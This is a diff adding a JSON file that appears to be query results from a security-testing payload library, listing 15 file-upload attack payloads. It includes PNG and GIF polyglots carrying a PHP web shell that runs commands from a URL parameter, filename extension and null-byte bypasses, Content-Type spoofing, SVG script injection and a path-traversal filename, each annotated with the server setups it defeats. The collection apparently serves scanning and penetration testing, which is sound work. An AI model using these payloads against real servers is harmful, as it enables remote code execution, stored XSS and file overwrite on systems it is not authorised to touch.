@@ -1,0 +1,270 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "file_upload"
+  },
+  "count": 15,
+  "results": [
+    {
+      "id": "04abff385b9ff4f2",
+      "payload": "\\x89PNG\\r\\n\\x1a\\n\u003c?php system($_GET['c']); ?\u003e",
+      "technique": "content_type_mismatch",
+      "injection_surface": "file_upload",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "PNG magic bytes prefix with PHP payload.",
+      "source": "ensphere",
+      "tags": [
+        "magic_bytes",
+        "php",
+        "png",
+        "polyglot"
+      ]
+    },
+    {
+      "id": "0997e3e55ab7e909",
+      "payload": "shell.aspx.jpg",
+      "technique": "extension_bypass",
+      "injection_surface": "file_upload",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Double extension for IIS/ASP.NET context.",
+      "source": "ensphere",
+      "tags": [
+        "aspx",
+        "double",
+        "extension",
+        "iis"
+      ]
+    },
+    {
+      "id": "119ec053084ce349",
+      "payload": "shell.php;.jpg",
+      "technique": "extension_bypass",
+      "injection_surface": "file_upload",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Semicolon in filename — Tomcat/Jetty may treat content before ; as the real extension.",
+      "source": "ensphere",
+      "tags": [
+        "extension",
+        "semicolon",
+        "tomcat"
+      ]
+    },
+    {
+      "id": "19ac4d9825c4bece",
+      "payload": "../../../etc/passwd",
+      "technique": "extension_bypass",
+      "injection_surface": "file_upload",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Path traversal in upload filename — may overwrite arbitrary files on server.",
+      "source": "ensphere",
+      "tags": [
+        "filename",
+        "overwrite",
+        "path_traversal"
+      ]
+    },
+    {
+      "id": "2162b028dbe5cdff",
+      "payload": "shell.pHp",
+      "technique": "extension_bypass",
+      "injection_surface": "file_upload",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Case-variant extension — bypasses case-sensitive extension blocklists.",
+      "source": "ensphere",
+      "tags": [
+        "case",
+        "extension",
+        "php"
+      ]
+    },
+    {
+      "id": "2426d7cb175bcca7",
+      "payload": "shell.php.jpg",
+      "technique": "extension_bypass",
+      "injection_surface": "file_upload",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Double extension — Apache may process as PHP if AddHandler is misconfigured.",
+      "source": "ensphere",
+      "tags": [
+        "apache",
+        "double",
+        "extension",
+        "php"
+      ]
+    },
+    {
+      "id": "641a960b167e868f",
+      "payload": "GIF89a;\u003c?php system($_GET['c']); ?\u003e",
+      "technique": "content_type_mismatch",
+      "injection_surface": "file_upload",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "GIF magic bytes prefix with PHP code. Passes magic byte validation but contains executable code.",
+      "source": "ensphere",
+      "tags": [
+        "gif",
+        "magic_bytes",
+        "php",
+        "polyglot"
+      ]
+    },
+    {
+      "id": "697d86cde0424645",
+      "payload": "Content-Type: image/png",
+      "technique": "mime_bypass",
+      "injection_surface": "file_upload",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Upload executable with image/png Content-Type.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "mime",
+        "png"
+      ]
+    },
+    {
+      "id": "6f57176736e805f5",
+      "payload": "shell.php%00.jpg",
+      "technique": "extension_bypass",
+      "injection_surface": "file_upload",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Null byte extension bypass — truncates filename at %00 in legacy systems.",
+      "source": "ensphere",
+      "tags": [
+        "extension",
+        "null_byte",
+        "php"
+      ]
+    },
+    {
+      "id": "74e4f7b2c110b95e",
+      "payload": "shell.php5",
+      "technique": "extension_bypass",
+      "injection_surface": "file_upload",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Alternative PHP extension — php5, php7, phtml, pht are often executable.",
+      "source": "ensphere",
+      "tags": [
+        "alt",
+        "extension",
+        "php5"
+      ]
+    },
+    {
+      "id": "844b1c9623e6878e",
+      "payload": "Content-Type: application/octet-stream",
+      "technique": "mime_bypass",
+      "injection_surface": "file_upload",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Upload with generic octet-stream MIME — may bypass type-specific filters.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "mime",
+        "octet_stream"
+      ]
+    },
+    {
+      "id": "8cdd3a300dce14cd",
+      "payload": "Content-Type: image/jpeg",
+      "technique": "mime_bypass",
+      "injection_surface": "file_upload",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Upload PHP/executable file with image/jpeg Content-Type. Tests if server validates MIME only.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "image",
+        "mime"
+      ]
+    },
+    {
+      "id": "9621d1796bdf052f",
+      "payload": "shell.svg",
+      "technique": "extension_bypass",
+      "injection_surface": "file_upload",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "SVG file upload — SVG files can contain JavaScript via onload handlers. May achieve stored XSS.",
+      "source": "ensphere",
+      "tags": [
+        "extension",
+        "svg",
+        "xss"
+      ]
+    },
+    {
+      "id": "9ae0c4cfca8a3e61",
+      "payload": "shell.jsp.png",
+      "technique": "extension_bypass",
+      "injection_surface": "file_upload",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Double extension for Java/Tomcat context.",
+      "source": "ensphere",
+      "tags": [
+        "double",
+        "extension",
+        "jsp",
+        "tomcat"
+      ]
+    },
+    {
+      "id": "9d2431a92cc1abde",
+      "payload": "shell.phtml",
+      "technique": "extension_bypass",
+      "injection_surface": "file_upload",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "PHTML extension — another PHP-executable extension.",
+      "source": "ensphere",
+      "tags": [
+        "alt",
+        "extension",
+        "phtml"
+      ]
+    }
+  ]
+}
